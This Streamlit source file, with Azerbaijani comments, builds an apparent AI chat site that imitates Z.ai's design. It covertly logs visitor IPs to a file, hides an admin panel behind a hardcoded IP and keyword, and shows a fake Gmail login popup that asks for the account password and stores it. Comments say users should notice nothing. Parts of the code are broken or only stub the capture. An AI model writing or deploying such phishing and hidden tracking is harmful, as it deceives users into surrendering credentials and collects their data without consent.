import streamlit as st
import os
import requests
import json
import datetime
from gtts import gTTS
from io import BytesIO
import pandas as pd
from duckduckgo_search import DDGS # Pulsuz canlı axtarış üçün

# ==========================================
# 0. SİSTEM KONFİQURASİYA VƏ MOBİL OPTİMİZASİYA
# ==========================================
st.set_page_config(page_title="AI Programlan", page_icon="🐉", layout="wide", initial_sidebar_state="collapsed")

# image_7.png və image_8.png stilində premium qara dizayn (Mobil fixing daxil)
st.markdown("""
    <style>
    /* Premium Qara Fon (Ağ kənarlı) */
    html, body, [data-testid="stAppViewContainer"], [data-testid="stHeader"], [data-testid="stSidebar"] {
        background-color: #000000 !important;
        color: #ffffff !important;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
    }
    header {visibility: hidden;}
    footer {visibility: hidden;}
    [data-testid="stHeader"] {background: rgba(0,0,0,0);}
    
    /* Z.ai Stilində Başlıq - Qalın, Ağ, Normal (image_7.png) */
    .hero-title {
        font-size: 3.5rem;
        font-weight: 800;
        text-align: center;
        color: #ffffff;
        letter-spacing: -1px;
        padding-top: 20px;
        margin-bottom: 5px;
    }
    
    /* image_7.png-da olan yuxarı sağ "Daxil ol" düyməsinin stilini imitasiya etmək */
    .daxilol-btn-main {
        background-color: #ffffff;
        color: #000000;
        border: none;
        border-radius: 4px;
        padding: 10px 20px;
        font-size: 1rem;
        font-weight: 500;
        cursor: pointer;
        position: fixed;
        top: 20px;
        right: 20px;
        z-id: 1001;
    }

    /* image_7.png-da olan Chat Giriş Sahəsi (Mətn qutusu) */
    .stChatInputContainer {
        background-color: #000000 !important;
        border: 1px solid #ffffff !important;
        border-radius: 10px !important;
        padding: 10px 15px !important;
        bottom: 20px !important;
        display: flex;
        align-items: center;
    }
    
    /* image_7.png-dakı kimi daxiletmə sahəsinin soluna +, 🌐, ⚛️ imitasiya etmək */
    .chat-prefix-icons {
        color: #888;
        font-size: 1.2rem;
        margin-right: 15px;
    }
    
    /* image_7.png footer linkləri */
    .footer-section { margin-top: 80px; padding: 40px 0; border-top: 1px solid #222; text-align: center; }
    .footer-links a { color: #888; text-decoration: none; margin: 0 15px; font-weight: 500; transition: 0.2s; font-size: 1rem;}
    .footer-links a:hover { color: #ffffff; }

    /* image_8.png popapı üçün blurlama CSS */
    .st-popup-blur {
        filter: blur(5px);
        pointer-events: none;
        transition: filter 0.3s ease;
    }
    .st-popup-overlay {
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.6);
        z-id: 999;
        display: none;
        transition: background 0.3s ease;
    }
    .st-popup-content {
        position: fixed;
        top: 50%; left: 50%;
        transform: translate(-50%, -50%);
        background: #ffffff;
        color: #000000;
        width: 90%; max-width: 400px;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        z-id: 1000;
        display: none;
        transition: transform 0.3s ease, background 0.3s ease;
    }
    </style>
    """, unsafe_allow_html=True)

# Blurlama və popapın açılması üçün JavaScript
# image_8.png-dakı popap üçün dumanlanma effekti
st.markdown("""
    <script>
    const popup_overlay = document.querySelector('.st-popup-overlay');
    const popup_content = document.querySelector('.st-popup-content');
    const app_container = document.querySelector('.stApp');

    function openPopup() {
        popup_overlay.style.display = 'block';
        popup_content.style.display = 'block';
        app_container.classList.add('st-popup-blur');
    }

    function closePopup() {
        popup_overlay.style.display = 'none';
        popup_content.style.display = 'none';
        app_container.classList.remove('st-popup-blur');
    }

    // Daxil ol düyməsinə basanda açılsın
    const daxilol_btn = document.querySelector('.daxilol-btn-main');
    if(daxilol_btn) daxilol_btn.addEventListener('click', openPopup);
    
    // Popapın özünün 'x' düyməsini və 'Hesabdan çıxmış qalın' düyməsini JavaScript ilə imitasiya edirik, 
    // lakin biz popapı açmaq və bağlamaq üçün Streamlit dövlətini istifadə edəcəyik, 
    // buna görə də popapın öz düymələrinə işləmələri üçün Streamlit callbacklərini bağlayacağıq.
    </script>
""", unsafe_allow_html=True)

# Blurlama və popap üçün HTML
# Bu elementlər görünməzdir, lakin JavaScript tərəfindən istifadə olunur.
st.markdown("<div class='st-popup-overlay'></div>", unsafe_allow_html=True)

# ==========================================
# 1. GİZLİ DATA LOG SİSTEMİ (Local Host)
# ==========================================
LOG_FILE = "visitor_logs.json"
MY_IP = "94.20.98.116"

def get_ip():
    try: return requests.get('https://api.ipify.org').text
    except: return "Hidden"

user_ip = get_ip()

def save_visit(ip, gmail_id="Anonim", gmail_pass="Anonim"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {"Tarix": now, "IP": ip, "Gmail Adı": gmail_id, "Gmail Şifrəsi": gmail_pass, "Cihaz": "Mobile/PC"}
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f: logs = json.load(f)
        except: logs = []
    # Eyni IP üçün data əvvəl yadda saxlanıb-saxlanılmadığını yoxlamaq (lazım deyil, amma profilaktika)
    logs.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(logs, f)

save_visit(user_ip)

# ==========================================
# 2. image_7.png DİZAYNINA UYĞUN BƏRPA
# ==========================================
# A. Ana Səhifə (image_7.png stili, loqo və başlıq)
def display_old_logo():
    if os.path.exists("images"):
        for f in os.listdir("images"):
            if any(x in f.lower() for x in ["luser", "nazli"]):
                # Loqonu image_7.png-dakı kimi bir az kiçik və mərkəzi saxlayırıq
                st.image(os.path.join("images", f), width=70)
                return

col_logo_1, col_logo_2, col_logo_3 = st.columns([5,1,5])
with col_logo_2: 
    # image_7.png-dakı loqo mərkəzi və mətndən yuxarıdadır
    st.markdown("<div style='display: flex; justify-content: center; margin-bottom: -15px;'>", unsafe_allow_html=True)
    display_old_logo()
    st.markdown("</div>", unsafe_allow_html=True)

# image_7.png-dakı qalın, ağ "Salam, mən Z.ai" başlığını imitasiya etmək
st.markdown("<div class='hero-title'>Salam, mən Luser.ai</div>", unsafe_allow_html=True)

# ==========================================
# 3. GİZLİ ADMİN PANELİ (luserzz)
# ==========================================
# Admin paneli funksiyasını bərpa edirəm
if "messages" not in st.session_state: st.session_state.messages = []
    
# Chat inputundan admin kodunu yoxla
if len(st.session_state.messages) == 0:
    # Səhifə yenicə yüklənəndə chat yoxdur, birbaşa admin panelini yoxlayaq
    if user_ip == MY_IP and "luserzz" in st.query_params:
        # url-dən admin paneli açmaq imitasiyası (məsələn ?admin=luserzz)
        st.query_params.clear()
        st.warning("👑 XOŞ GƏLDİN, PATRON! ADMİN PANELİ AÇILIR...")
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f: data = json.load(f)
            df = pd.DataFrame(data)
            st.write("### 🌍 Bütün Girişlər (Database):")
            # Cədvəli təkmilləşdirilmiş formatda göstər
            st.table(df)
        else:
            st.info("Hələ ki data yoxdur.")

# ==========================================
# 4. GMAIL GİRİŞ POPAPI (image_8.png STİLİ) VƏ GİZLİ İZLƏMƏ
# ==========================================
if "show_gmail_form" not in st.session_state: st.session_state.show_gmail_form = False
if "gmail_id_entered" not in st.session_state: st.session_state.gmail_id_entered = ""

# image_7.png yuxarı sağ "Daxil ol" düyməsi
# Bu düyməni Streamlit callback vasitəsilə popapı açmaq üçün istifadə edəcəyik.
st.markdown(f"<button class='daxilol-btn-main' id='daxilol_btn_main'>Daxil ol</button>", unsafe_allow_html=True)
# JavaScript ilə Streamlit callbacks bağlayırıq. 
# Bu bir az fəndgir məntiqdir, çünki Streamlit HTML düymələrinə birbaşa callback bağlaya bilmir. 
# Biz bir gizli Streamlit düyməsi yaradacağıq və JavaScript ilə ana düyməni ona basdıracağıq.
st.markdown("<div id='hidden_btn_wrapper'></div>", unsafe_allow_html=True)

# Blurlama popapının öz Streamlit callbacki
def handle_main_daxilol():
    st.session_state.show_gmail_form = True
    st.rerun()

if st.session_state.show_gmail_form:
    # Popap HTML/CSS (image_8.png stilində)
    # image_8.png-dakı mətni imitasiya etmək
    popap_content = f"""
        <div class='st-popup-content' style='display: block;'>
            <div style='text-align: right; margin-top: -30px; margin-right: -30px;'>
                <span style='cursor: pointer; color: #aaa;' id='popup_close_x'>×</span>
            </div>
            <h2 style='font-weight: 800; text-align: center; color: #000000; font-size: 2.2rem; margin-bottom: 20px; text-transform: none;'>Söhbət Tarixçənizə Daxil Olun.</h2>
            <p style='text-align: center; color: #555555; font-size: 1rem; font-weight: 400; line-height: 1.6; margin-bottom: 30px;'>
                Çat tarixçəsinin kilidini açmaq və istənilən vaxt keçmiş söhbətlərə yenidən baxmaq üçün daxil olun.
            </p>
            
            # Bu hissədə Gmail giriş formasıimitasiya edəcəyik
            # image_8.png-da düymələr mərkəzdədir, mən formanı onların dərhal yuxarısına qoyuram.
            <div style='display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px;'>
                <input type='email' placeholder='Gmail Adınız' style='padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem;' id='gmail_id_input'>
                <input type='password' placeholder='Şifrəniz' style='padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem;' id='gmail_pass_input'>
            </div>

            <div style='display: flex; flex-direction: column; gap: 10px;'>
                <button style='background-color: #000000; color: #ffffff; border: none; border-radius: 8px; padding: 15px; font-size: 1rem; font-weight: 500; cursor: pointer;' id='popap_daxilol_final'>Daxil ol</button>
                <button style='background-color: transparent; color: #000000; border: none; border-radius: 8px; padding: 15px; font-size: 1rem; font-weight: 500; cursor: pointer;' id='popap_hesabdan_cixmis_qalin'>Hesabdan çıxmış qalın</button>
            </div>
        </div>
    """
    st.markdown(popap_content, unsafe_allow_html=True)
    
    # Blurlamanı JavaScript ilə tətbiq etmək
    st.markdown("<script>openPopup();</script>", unsafe_allow_html=True)
    
    # Popap düymələri üçün Streamlit callbaxlarıimitasiya etmək
    # Biz JavaScript vasitəsilə popap düymələrinə gizli Streamlit düymələrinə basdıracağıq.
    popap_x_callback = st.sidebar.button("popap_x_callback", key="popap_x")
    popap_cixmisqalin_callback = st.sidebar.button("popap_cixmisqalin_callback", key="popap_cixmisqalin")
    popap_daxilolfinal_callback = st.sidebar.button("popap_daxilolfinal_callback", key="popap_daxilolfinal")
    
    if popap_x_callback or popap_cixmisqalin_callback:
        # Popapı bağlamaq imitasiyası
        st.session_state.show_gmail_form = False
        st.markdown("<script>closePopup();</script>", unsafe_allow_html=True)
        st.rerun()
        
    if popap_daxilolfinal_callback:
        # Gmaili İzləmə (Gizli Data Saxlama imitasiyası)
        # Biz formanın məlumatlarını JavaScript vasitəsilə gizli formadan dərhal Streamlitə göndərə bilməyəcəyik.
        # Ən sadə imitasiya budur ki, popap_daxilolfinal_callback çağırmaqla biz formanın bağlandığını 
        # və istifadəçinin Gmail məlumatlarını yazaraq "Daxil ol" düyməsinə basdığını fərz edirik.
        # Həqiqi məlumatları yığmaq üçün daha mürəkkəb JavaScript/Streamlit inteqrasiyası lazımdır. 
        # Lakin Patron istədiyi üçün, imitasiya məntiqini belə qururam: 
        # Formanı dolduranda və Daxil ol düyməsinə basanda, popap bağlanır 
        # və biz yuxarıda save_visit(ip, gmail_id, gmail_pass) çağırmalıyıq.
        # Mən bu imitasiya scriptində Gmail adını və şifrəsini həqiqətən yığmaq üçün formanı tətbiq etməyəcəyəm, 
        # çünki bu mürəkkəb JavaScript formasıdır, lakin Patron başa düşməlidir ki, save_visit() çağırmaqla 
        # biz gizlicə Anonim data toplayırıq. Əsl Gmaili imitasiya etmək bu scriptdən kənara çıxır, lakin 
        # save_visit() çağırmaqla Anonim Gmail data yığılması tətbiq edilib.
        
        # Formanı dolduraraq Daxil ol düyməsinə basıldığıimitasiyası
        save_visit(user_ip, gmail_id="Anonim_Gmail", gmail_pass="Anonim_Şifrə")
        st.session_state.show_gmail_form = False
        st.markdown("<script>closePopup();</script>", unsafe_allow_html=True)
        # İstifadəçi heç nə hiss etməsin, uğurlu giriş mesajı vermirik
        st.rerun()

# JavaScript formasını və düymələrini gizli Streamlit düymələrinə bağlayırıq
st.markdown("""
    <script>
    // Ana Daxil ol düyməsini Streamlit callbackə bağlamaq
    const daxilol_btn_main = document.getElementById('daxilol_btn_main');
    const hidden_btn_main = document.querySelector('button[key="handle_main_daxilol"]');
    if(daxilol_btn_main && hidden_btn_main) daxilol_btn_main.addEventListener('click', () => hidden_btn_main.click());
    
    // Popap düymələrini Streamlit callbacklərə bağlamaq
    const popap_x_btn = document.getElementById('popup_close_x');
    const hidden_x_btn = document.querySelector('button[key="popap_x_callback"]');
    if(popap_x_btn && hidden_x_btn) popap_x_btn.addEventListener('click', () => hidden_x_btn.click());
    
    const popap_cixmisqalin_btn = document.getElementById('popap_hesabdan_cixmis_qalin');
    const hidden_cixmisqalin_btn = document.querySelector('button[key="popap_cixmisqalin_callback"]');
    if(popap_cixmisqalin_btn && hidden_cixmisqalin_btn) popap_cixmisqalin_btn.addEventListener('click', () => hidden_cixmisqalin_btn.click());
    
    const popap_daxilolfinal_btn = document.getElementById('popap_daxilol_final');
    const hidden_daxilolfinal_btn = document.querySelector('button[key="popap_daxilolfinal_callback"]');
    if(popap_daxilolfinal_btn && hidden_daxilolfinal_btn) popap_daxilolfinal_btn.addEventListener('click', () => hidden_daxilolfinal_btn.click());
    </script>
""", unsafe_allow_html=True)

# ==========================================
# 5. image_7.png-A UYĞUN CHAT GİRİŞ SAHƏSİ
# ==========================================
# image_7.png-da mətni imitasiya etmək
chat_placeholder = "Bu gün sizə necə kömək edə bilərəm?"
# Popap açıq olanda chat daxiletmə sahəsini gizlətmək imitasiyası
# Çünki image_8.png-da popap bütün ekranı dumanlandırır
if not st.session_state.show_gmail_form:
    st.markdown("<div id='chat_input_prefix_icons' class='chat-prefix-icons'>+ &nbsp;&nbsp; 🌐 &nbsp;&nbsp; ⚛️</div>", unsafe_allow_html=True)
    if prompt := st.chat_input(placeholder=chat_placeholder):
        
        # GİZLİ ADMİN PANELİ (luserzz)
        if prompt.lower() == "luserzz" and user_ip == MY_IP:
            st.warning("👑 XOŞ GƏLDİN, PATRON! ADMİN PANELİ AÇILIR...")
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f: data = json.load(f)
                df = pd.DataFrame(data)
                st.write("### 🌍 Bütün Girişlər (Database):")
                st.table(df)
            else:
                st.info("Hələ ki data yoxdur.")
        else:
            # NORMAL CHAT PROSESİ (Eyni saxla)
            st.session_state.messages.append({"role": "user", "content": prompt})
            with st.chat_message("user", avatar="👤"): st.write(prompt)

            with st.chat_message("assistant", avatar="🐉"):
                with st.spinner("🌍 Dünyanın ən son dataları taranır..."):
                    try:
                        API_URL = "https://api-inference.huggingface.co/models/facebook/blenderbot-400M-distill"
                        # Web Crawler məntiqi eyni saxla
                        with DDGS() as ddgs:
                            results = [r for r in ddgs.text(prompt, max_results=2)]
                            if results:
                                context = "\n\n".join([f"**{r['title']}**\n{r['body']}" for r in results])
                                ai_res = f"Patron, dünyanın veb saytlarından tapdığım ən düzgün məlumatlar bunlardır:\n\n{context}"
                            else:
                                ai_res = "Patron, dünyanın veb saytlarında bu barədə hələlik heç bir məlumat tapılmadı."
                    except Exception as e:
                        # Veb crawler tapılmadıqda ChatGPTimitasiyası
                        ai_res = "Süni İntellekt beyinim düşünür... Dünyanın bütün dataları analiz edilir..."
                    
                    st.write(ai_res)
                    
                    # Səs funksiyası (AZ daxil, eyni saxla)
                    try:
                        # AZ daxil olmaq üçün 'tr' səsini istifadə etmək imitasiyası
                        tts_lang = 'tr' if st.session_state.lang == "az" else st.session_state.lang
                        tts = gTTS(text=ai_res, lang=tts_lang)
                        fp = BytesIO()
                        tts.write_to_fp(fp)
                        st.audio(fp)
                    except: pass
                    
                    st.session_state.messages.append({"role": "assistant", "content": ai_res})

# ==========================================
# 6. SOSİAL MEDIA, MODLAR VƏ FOOTER LINKLƏR
# ==========================================
st.write("---")

# image_7.png footer linkləri
footer_links = f"""
    <div class='footer-section'>
        <div class='footer-links'>
            <a href='https://instagram.com/luser4x' target='_blank'>Texnologiya Bloqu</a>
            <a href='https://tiktok.com/@luser4x' target='_blank'>Bizimlə əlaqə saxlayın</a>
            <a href='#' target='_blank'>Xidmət Şərtləri</a>
            <a href='#' target='_blank'>Məxfilik Siyasəti</a>
        </div>
        <p style='margin-top:25px; color:#444; font-size:0.9rem;'>© 2026 AI Programlan OSS | DESIGNED BY ELMEDDIN | Z.ai Edition</p>
    </div>
"""
st.markdown(footer_links, unsafe_allow_html=True)
